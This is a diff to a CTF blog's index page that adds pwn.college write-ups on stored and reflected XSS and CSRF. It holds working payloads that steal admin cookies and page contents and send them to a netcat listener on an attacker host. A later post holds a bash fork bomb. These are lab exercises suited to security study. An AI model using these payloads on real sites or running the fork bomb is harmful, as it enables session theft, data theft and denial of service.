@@ -236,7 +236,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">190</span>
+          <span class="site-state-item-count">196</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -247,7 +247,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">113</span>
+        <span class="site-state-item-count">114</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -274,6 +274,1492 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-xss/" class="post-title-link" itemprop="url">PwnCollege - XSS</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-14 13:11:53" itemprop="dateCreated datePublished" datetime="2026-03-14T13:11:53+08:00">2026-03-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-xss/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-xss/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="stored-xss">stored xss</h2>
+<h3 id="xss-1">xss 1</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&quot;content=&lt;input type=&#x27;text&#x27;&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss-2">xss 2</h3>
+<p>inject <code>&lt;script&gt;</code> via stored post, then trigger with
+<code>/challenge/victim</code> (headless Firefox).</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://challenge.localhost:80/&quot;</span> -d <span class="string">&#x27;content=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span></span><br><span class="line">/challenge/victim</span><br></pre></td></tr></table></figure>
+<h2 id="reflected-xss">reflected xss</h2>
+<h3 id="xss-3">xss 3</h3>
+<p>msg is reflected directly into the page body:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The message:</span><br><span class="line">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss-4">xss 4</h3>
+<p>msg is reflected inside a <code>&lt;textarea&gt;</code>, break out
+first:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea name=msg&gt;&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Type your message here!&quot;</span>)&#125;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/challenge/victim <span class="string">&quot;http://challenge.localhost:80/?msg=&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-5---stored-xss-csrf-get-publish">xss 5 - stored XSS + CSRF
+(GET publish)</h2>
+<p>admin’s unpublished draft contains the flag. published posts render
+raw HTML. <code>/publish</code> is <strong>GET</strong>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br></pre></td></tr></table></figure>
+<p>login as hacker, store XSS that makes admin’s browser call
+<code>/publish</code>, which publishes admin’s flag draft:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-6---stored-xss-csrf-post-publish">xss 6 - stored XSS + CSRF
+(POST publish)</h2>
+<p>same as xss 5, but <code>/publish</code> is now
+<strong>POST</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [username])</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;/publish&#x27;, &#123;method: &#x27;POST&#x27;&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line">/challenge/victim</span><br><span class="line">curl -b cookie.txt <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="xss-7---cookie-stealing">xss 7 - cookie stealing</h2>
+<p>key differences from xss 5/6:</p>
+<ul>
+<li>auth is cookie-based: <code>auth=username|password</code> (not
+flask.session)</li>
+<li>admin password = <code>flag[-20:]</code> (truncated flag)</li>
+<li>admin is blocked from posting/publishing</li>
+<li>drafts are visible to their own author</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(<span class="string">&quot;auth&quot;</span>, username + <span class="string">&quot;|&quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin blocked</span></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">    flask.abort(<span class="number">400</span>, <span class="string">&quot;pwnpost no longer supports admin posting due to rampant flag disclosure&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># drafts visible to author</span></span><br><span class="line"><span class="keyword">elif</span> post[<span class="string">&quot;author&quot;</span>] == username:</span><br><span class="line">    page += <span class="string">&quot;&lt;b&gt;YOUR DRAFT POST:&lt;/b&gt; &quot;</span> + post[<span class="string">&quot;content&quot;</span>] + <span class="string">&quot;&lt;hr&gt;\n&quot;</span></span><br></pre></td></tr></table></figure>
+<p>since admin can’t publish, steal the cookie instead and log in as
+admin to view the draft:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. login as hacker, store XSS that exfiltrates document.cookie</span></span><br><span class="line">curl -c cookie.txt -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl -b cookie.txt -X POST http://challenge.localhost:80/draft \</span><br><span class="line">  -d <span class="string">&quot;content=&lt;script&gt;fetch(&#x27;http://localhost:1337/&#x27;, &#123;method: &#x27;POST&#x27;, body: document.cookie&#125;)&lt;/script&gt;&amp;publish=on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. listen for stolen cookie</span></span><br><span class="line">nc -l -p 1337 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. trigger victim (admin) to visit the page</span></span><br><span class="line">/challenge/victim</span><br><span class="line"><span class="comment"># received: auth=admin|RT.dJDO1YDL4cjM1gzW&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. use stolen cookie to view as admin</span></span><br><span class="line">curl --cookie <span class="string">&quot;auth=admin|RT.dJDO1YDL4cjM1gzW&#125;&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-CSRF/" class="post-title-link" itemprop="url">PwnCollege - CSRF</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-03-14 12:47:07 / Modified: 12:47:09" itemprop="dateCreated datePublished" datetime="2026-03-14T12:47:07+08:00">2026-03-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-CSRF/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-CSRF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="csrf-1">CSRF 1</h2>
+<p>In this level, the application has a <code>/publish</code> route that
+uses a <code>GET</code> request to change the state of the application
+(publishing drafts). Since <code>GET</code> requests should ideally be
+idempotent and not change state, this is a classic CSRF
+vulnerability.</p>
+<h3 id="analysis">Analysis</h3>
+<p>The server-side code for the <code>/publish</code> route:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Vulnerability: State change via GET request with no CSRF protection</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="exploit">Exploit</h3>
+<p>We can host a simple HTML page that redirects the victim (the admin)
+to the <code>/publish</code> endpoint. When the admin visits our page,
+their browser will automatically include their session cookies when
+following the redirect to <code>challenge.localhost</code>.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://challenge.localhost:80/publish&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload: <code>python3 -m http.server 1337</code></li>
+<li>Trigger the victim to visit your server:
+<code>/challenge/victim</code></li>
+<li>The admin’s drafts are now published. Fetch the flag:
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://challenge.localhost:80/login -d <span class="string">&quot;username=hacker&amp;password=1337&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-2-post-based-csrf">CSRF Level 2: POST-based CSRF</h2>
+<p>The <code>/publish</code> route now requires a <code>POST</code>
+request. While this prevents simple link-based triggers, it doesn’t stop
+CSRF if there are no CSRF tokens or origin checks.</p>
+<h3 id="exploit-1">Exploit</h3>
+<p>We use an HTML form that automatically submits itself via JavaScript
+to perform the <code>POST</code> request on behalf of the admin.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;http://challenge.localhost:80/publish&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Host the payload on port 1337.</li>
+<li>Run <code>/challenge/victim</code>.</li>
+<li>Login and check the published posts to find the flag.</li>
+</ol>
+<h2 id="csrf-level-3-reflected-xss">CSRF Level 3: Reflected XSS</h2>
+<p>This level introduces a reflected XSS vulnerability in the
+<code>/ephemeral</code> route. The <code>msg</code> parameter is
+rendered directly into the page without sanitization.</p>
+<h3 id="analysis-1">Analysis</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ephemeral&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_ephemeral</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;You have received an ephemeral message!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        The message: <span class="subst">&#123;flask.request.args.get(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;(none)&quot;</span>)&#125;</span></span></span><br><span class="line"><span class="string">        &lt;hr&gt;&lt;form&gt;Craft an ephemeral message:&lt;input type=text name=msg action=/ephemeral&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="exploit-2">Exploit</h3>
+<p>We can inject a script tag through the <code>msg</code>
+parameter.</p>
+<p><strong>Payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload = <span class="string">&quot;&lt;script&gt;alert(&#x27;PWNED&#x27;)&lt;/s&quot;</span> + <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="csrf-level-4-cookie-stealing-via-xss">CSRF Level 4: Cookie
+Stealing via XSS</h2>
+<p>Building on the previous level, we use the XSS vulnerability to steal
+the admin’s session cookie.</p>
+<h3 id="exploit-3">Exploit</h3>
+<p>We inject a script that reads <code>document.cookie</code> and sends
+it to our attacker-controlled listener.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> xss_payload =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;http://hacker.localhost:1338/?stolen_cookie=&#x27; + encodeURIComponent(document.cookie));&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(xss_payload);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the incoming cookie: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>Once the cookie is captured (e.g., <code>auth=admin|...</code>), use
+it to access the flag: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cookie <span class="string">&quot;auth=admin|...&quot;</span> <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="csrf-level-5-data-exfiltration-via-xss">CSRF Level 5: Data
+Exfiltration via XSS</h2>
+<p>In this final level, we use XSS to fetch the content of the admin’s
+home page (where the flag is displayed) and send the entire HTML back to
+our listener.</p>
+<h3 id="exploit-4">Exploit</h3>
+<p>The payload performs an internal <code>fetch('/')</code> while the
+admin is authenticated, then <code>POST</code>s the response body to the
+attacker.</p>
+<p><strong>Payload (<code>index.html</code>):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> stage2_xss =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;&lt;script&gt;fetch(&#x27;/&#x27;).then(res =&gt; res.text()).then(html =&gt; fetch(&#x27;http://hacker.localhost:1338&#x27;, &#123;method: &#x27;POST&#x27;, body: html&#125;))&lt;/s&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;cript&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> target_url =</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;http://challenge.localhost:80/ephemeral?msg=&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">encodeURIComponent</span>(stage2_xss);</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = target_url;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Execution:</strong></p>
+<ol type="1">
+<li>Listen for the POST data: <code>nc -l -p 1338</code></li>
+<li>Host the payload and trigger the victim.</li>
+<li>The flag will be contained within the HTML received by Netcat.</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-basic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/PwnCollege/PwnCollege-basic/" class="post-title-link" itemprop="url">PwnCollege - note basic</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-03-11 03:48:13" itemprop="dateCreated datePublished" datetime="2026-03-11T03:48:13+08:00">2026-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-03-15 15:43:00" itemprop="dateModified" datetime="2026-03-15T15:43:00+08:00">2026-03-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/PwnCollege/PwnCollege-basic/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-basic/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="fork-bomb">1. Fork Bomb</h2>
+<p>A classic bash fork bomb that recursively calls itself to exhaust
+system resources.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">myfunc</span></span> () &#123;</span><br><span class="line">  myfunc | myfunc</span><br><span class="line">&#125;</span><br><span class="line">myfunc</span><br></pre></td></tr></table></figure>
+<h2 id="web-security">2. Web Security</h2>
+<h3 id="basic-requests">2.1 Basic Requests</h3>
+<p>Using <code>netcat</code> and <code>curl</code> to perform simple GET
+requests.</p>
